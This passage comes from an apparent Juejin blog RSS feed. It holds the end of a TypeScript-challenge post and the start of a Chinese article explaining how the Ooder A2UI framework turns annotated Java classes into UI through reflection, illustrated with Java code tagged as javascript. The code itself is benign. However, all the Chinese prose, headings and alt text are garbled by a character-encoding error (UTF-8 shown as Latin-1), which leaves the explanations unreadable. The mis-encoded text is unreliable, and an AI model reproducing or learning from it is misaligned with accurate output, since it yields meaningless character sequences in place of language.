<p>åˆ†äº«ä½ çš„è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/20/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/20/answer/zâ€¦</a>
æŸ¥çœ‹è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fsolutions" target="_blank" title="https://tsch.js.org/20/solutions" ref="nofollow noopener noreferrer">tsch.js.org/20/solutionâ€¦</a>
æ›´å¤šé¢˜ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å…¬ä¼—å·ï¼Œæ¬¢è¿å…³æ³¨ã€‚å…³æ³¨åæœ‰æ–°çš„åŠŸèƒ½ç‚¹ä¼šåŠæ—¶æ”¶åˆ°æ¨é€ã€‚</p>
<blockquote>
<p><strong>å‰ç«¯åŠŸèƒ½ç‚¹</strong>ï¼šå®æˆ˜ä¸ºç‹ï¼ä¸“æ³¨äºæ±‡æ€»å„ç§åŠŸèƒ½ç‚¹ï¼Œè‡´åŠ›äºæ‰“é€ ä¸€ç³»åˆ—èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå®ç°å„ç§åŠŸèƒ½çš„æƒ³æ³•æ€è·¯çš„ä¼˜è´¨æ–‡ç« ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ooder A2UI ç¬¬ä¸€æ€§åŸç†å‡ºå‘ æ·±åº¦è§£ææ ¸å¿ƒé€»è¾‘]]></title>    <link>https://juejin.cn/post/7602454700503810089</link>    <guid>https://juejin.cn/post/7602454700503810089</guid>    <pubDate>2026-02-03T14:10:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503810089" data-draft-id="7602503154505383977" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ooder A2UI ç¬¬ä¸€æ€§åŸç†å‡ºå‘ æ·±åº¦è§£ææ ¸å¿ƒé€»è¾‘"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-03T14:10:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ooder A2UI ç¬¬ä¸€æ€§åŸç†å‡ºå‘ æ·±åº¦è§£ææ ¸å¿ƒé€»è¾‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:10:58.000Z" title="Tue Feb 03 2026 14:10:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>Ooder A2UIï¼ˆAnnotation to UIï¼‰æ˜¯Ooderæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œè´Ÿè´£å°†Javaç±»é€šè¿‡æ³¨è§£é©±åŠ¨çš„æ–¹å¼è‡ªåŠ¨è½¬æ¢ä¸ºUIç»„ä»¶ã€‚è¿™ä¸€æœºåˆ¶æ˜¯Ooderå®ç°"é…ç½®å³ä»£ç "ç†å¿µçš„å…³é”®æŠ€æœ¯ï¼Œä¹Ÿæ˜¯å¤–ç•Œæœ€è´¨ç–‘çš„åœ°æ–¹ï¼š<strong>ç©¶ç«Ÿæ˜¯ä»€ä¹ˆé€»è¾‘è®©å®ƒèƒ½å¤Ÿå®Œæˆæ‹†è§£ï¼Ÿå¦‚ä½•ä¿è¯ç¡®å®šæ€§ï¼Ÿç»„ç»‡ç±»æ–¹æ³•çš„åŸåˆ™è§„åˆ™æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>æœ¬æ–‡å°†ä»ç¬¬ä¸€æ€§åŸç†å‡ºå‘ï¼Œæ·±å…¥å‰–æA2UIçš„æ ¸å¿ƒè®¾è®¡ï¼Œè¿˜åŸä½œè€…çš„è®¾è®¡æ€è€ƒè¿‡ç¨‹ã€‚</p>
<h2 data-id="heading-1">A2UI æ‹†è§£æœºåˆ¶çš„æ ¸å¿ƒåŸç†</h2>
<h3 data-id="heading-2">1. æ•´ä½“æ¶æ„æ¦‚è§ˆ</h3>
<p>A2UIçš„æ‹†è§£æœºåˆ¶åŸºäº<strong>æ³¨è§£é©±åŠ¨çš„åå°„åˆ†æ</strong>ï¼Œé€šè¿‡å¤šå±‚æ¬¡çš„æŠ½è±¡å’Œæ˜ å°„ï¼Œå°†Javaç±»è½¬æ¢ä¸ºUIç»„ä»¶ã€‚æ•´ä½“æ¶æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86710486af040f1a74cb9edd948eb08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=Cb9%2FKytN7lOQYLEYLt8sp1xZ9JY%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h3 data-id="heading-3">2. å…­é˜¶æ®µæ‹†è§£æµç¨‹</h3>
<p>A2UIçš„æ‹†è§£è¿‡ç¨‹åˆ†ä¸ºå…­ä¸ªæ˜ç¡®çš„é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æœ‰å…¶ç‰¹å®šçš„èŒè´£å’Œç¡®å®šæ€§ä¿éšœã€‚</p>
<h4 data-id="heading-4">é˜¶æ®µ1ï¼šç±»åŠ è½½é˜¶æ®µ</h4>
<p>ReflectionClassLoaderBridgeClassUserReflectionClassLoaderBridgeClassUseråˆ›å»ºBridgeClassåŠ è½½Javaç±»è·å–ç±»ä¿¡æ¯è¿”å›ç±»ä¿¡æ¯è¿”å›ç±»å¯¹è±¡è·å–æ‰€æœ‰å­—æ®µè¿”å›å­—æ®µåˆ—è¡¨è·å–æ‰€æœ‰æ–¹æ³•è¿”å›æ–¹æ³•åˆ—è¡¨è¿”å›BridgeClasså®ä¾‹</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23b5694417794ea9b6fdb8afbaaf2535~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=686cL98ysllVGLIi%2BD%2FvQszPW8Q%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Class ctClass</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctClass</span> = ctClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtFields</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// è·å–å£°æ˜çš„å­—æ®µï¼ˆéé™æ€ã€éå†…éƒ¨ç±»å­—æ®µï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getDeclaredFields</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(field.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// è·å–å…¬å…±å­—æ®µ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getFields</span>()) {
        <span class="hljs-keyword">if</span> (field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// è·å–å£°æ˜çš„æ–¹æ³•ï¼ˆéé™æ€ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtMethods</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; methodNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getDeclaredMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
            methodNames.<span class="hljs-title function_">add</span>(method.<span class="hljs-title function_">getName</span>());
        }
    }

    <span class="hljs-comment">// è·å–å…¬å…±æ–¹æ³•ï¼ˆå»é‡ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !methodNames.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getName</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Enum</span>.<span class="hljs-property">class</span>)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
        }
    }
}
</code></pre>
<h4 data-id="heading-5">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆåŒºåˆ†å£°æ˜å­—æ®µå’Œå…¬å…±å­—æ®µï¼Ÿ</strong>
<ul>
<li>å£°æ˜å­—æ®µï¼šè·å–ç±»è‡ªå·±å®šä¹‰çš„å­—æ®µï¼ŒåŒ…æ‹¬ç§æœ‰å­—æ®µ</li>
<li>å…¬å…±å­—æ®µï¼šè·å–ç»§æ‰¿çš„å…¬å…±å­—æ®µï¼Œæ”¯æŒç»§æ‰¿åœºæ™¯</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆè¿‡æ»¤é™æ€æˆå‘˜ï¼Ÿ</strong>
<ul>
<li>é™æ€æˆå‘˜å±äºç±»è€Œéå®ä¾‹ï¼Œä¸é€‚åˆUIç»‘å®š</li>
<li>é¿å…é™æ€æˆå‘˜å¹²æ‰°UIæ¸²æŸ“</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆè¿‡æ»¤å†…éƒ¨ç±»å­—æ®µï¼Ÿ</strong>
<ul>
<li>å†…éƒ¨ç±»å­—æ®µé€šå¸¸ç”¨äºç¼–è¯‘å™¨ç”Ÿæˆçš„è¾…åŠ©é€»è¾‘</li>
<li>é¿å…å°†ç¼–è¯‘å™¨ç”Ÿæˆçš„å­—æ®µè¯¯è®¤ä¸ºä¸šåŠ¡å­—æ®µ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-6">é˜¶æ®µ2ï¼šæ³¨è§£è§£æé˜¶æ®µ</h4>
<p>â€‹</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d070da24dc441669ae7c902480889d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=GBqm3R8RHzlBOxFvj5G5r%2Fv78HI%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">MethodChinaName</span> chinaName = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MethodChinaName</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (chinaName != <span class="hljs-literal">null</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodChinaBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodChinaMeta</span>(chinaName);
}

<span class="hljs-title class_">RepositoryAnnotation</span> repository = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RepositoryAnnotation</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (repository != <span class="hljs-literal">null</span>) {
    repositoryBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RepositoryMeta</span>(repository);
}

<span class="hljs-title class_">Aggregation</span> aggregationClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (aggregationClass != <span class="hljs-literal">null</span>) {
    aggregationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregationBean</span>(aggregationClass);
}

<span class="hljs-title class_">ESDEntity</span> dsmEntityClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">ESDEntity</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (dsmEntityClass != <span class="hljs-literal">null</span>) {
    entityBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntityBean</span>(dsmEntityClass);
}

<span class="hljs-title class_">MenuBarMenu</span> menuBarMenu = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MenuBarMenu</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (menuBarMenu != <span class="hljs-literal">null</span>) {
    menuBarBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuBarMeta</span>(menuBarMenu);
}

<span class="hljs-title class_">DBTable</span> dbTable = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">DBTable</span>.<span class="hljs-property">class</span>);

<span class="hljs-title class_">RequestMapping</span> requestMapping = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RequestMapping</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (requestMapping != <span class="hljs-literal">null</span>) {
    requestMappingBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingBean</span>(requestMapping);
}

<span class="hljs-title class_">View</span> view = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">View</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (view != <span class="hljs-literal">null</span>) {
    viewBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewBean</span>(view);
}
</code></pre>
<h4 data-id="heading-7">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¹ˆå¤šç±»çº§åˆ«æ³¨è§£ï¼Ÿ</strong>
<ul>
<li>ä¸åŒçš„æ³¨è§£å¯¹åº”ä¸åŒçš„ä¸šåŠ¡åœºæ™¯</li>
<li>@Aggregationï¼šèšåˆè§†å›¾ï¼Œç”¨äºç»„åˆå¤šä¸ªå®ä½“</li>
<li>@Repositoryï¼šä»“å‚¨è§†å›¾ï¼Œç”¨äºæ•°æ®è®¿é—®</li>
<li>@ESDEntityï¼šå®ä½“è§†å›¾ï¼Œç”¨äºæ•°æ®å®ä½“</li>
<li>@MenuBarMenuï¼šèœå•è§†å›¾ï¼Œç”¨äºå¯¼èˆªèœå•</li>
<li>@RequestMappingï¼šRESTè§†å›¾ï¼Œç”¨äºAPIæ¥å£</li>
<li>@Viewï¼šé€šç”¨è§†å›¾ï¼Œç”¨äºè‡ªå®šä¹‰è§†å›¾</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆæ³¨è§£è§£æåè¦è½¬æ¢ä¸ºBeanï¼Ÿ</strong>
<ul>
<li>ç»Ÿä¸€çš„æ•°æ®ç»“æ„ï¼Œä¾¿äºåç»­å¤„ç†</li>
<li>è§£è€¦æ³¨è§£ç±»å‹å’Œä¸šåŠ¡é€»è¾‘</li>
<li>æ”¯æŒæ³¨è§£çš„ç‰ˆæœ¬æ¼”è¿›</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">é˜¶æ®µ3ï¼šå­—æ®µæ‹†è§£é˜¶æ®µ</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89ece97dcf744ef18cc23c16d13daaed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=hivxwzegVDtGfCrBWurs9kPen7w%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">initField</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; fieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; disableFieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">CustomAnnotation</span>&gt; customAnnotationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    int index = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// å¹¶è¡Œå¤„ç†å­—æ®µåˆå§‹åŒ–</span>
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Callable</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt;&gt; fieldTasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
        fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
        index++;
    }
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt; fields = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">invokFieldTasks</span>(className, fieldTasks);

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeFieldConfig</span> fieldInfo : fields) {
        <span class="hljs-title class_">Field</span> field = fieldInfo.<span class="hljs-property">field</span>;
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isSerialize</span>()) {
            fieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            esdFieldMap.<span class="hljs-title function_">put</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>(), fieldInfo);
            fieldNameList.<span class="hljs-title function_">add</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>());
        } <span class="hljs-keyword">else</span> {
            disableFieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            disableFieldList.<span class="hljs-title function_">add</span>(fieldInfo);
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isUid</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = field.<span class="hljs-title function_">getName</span>();
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isCaptionField</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">captionField</span> = fieldInfo;
        }
    }
}
</code></pre>
<h4 data-id="heading-9">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆä½¿ç”¨LinkedHashMapè€Œä¸æ˜¯HashMapï¼Ÿ</strong>
<ul>
<li>LinkedHashMapä¿æŒæ’å…¥é¡ºåº</li>
<li>ä¿è¯å­—æ®µçš„æ˜¾ç¤ºé¡ºåºä¸å£°æ˜é¡ºåºä¸€è‡´</li>
<li>æä¾›ç¡®å®šæ€§çš„å­—æ®µé¡ºåº</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆåŒºåˆ†fieldMapå’ŒdisableFieldMapï¼Ÿ</strong>
<ul>
<li>fieldMapï¼šéœ€è¦åºåˆ—åŒ–å’Œæ˜¾ç¤ºçš„å­—æ®µ</li>
<li>disableFieldMapï¼šä¸éœ€è¦æ˜¾ç¤ºçš„å­—æ®µï¼ˆå¦‚éšè—å­—æ®µã€ç³»ç»Ÿå­—æ®µï¼‰</li>
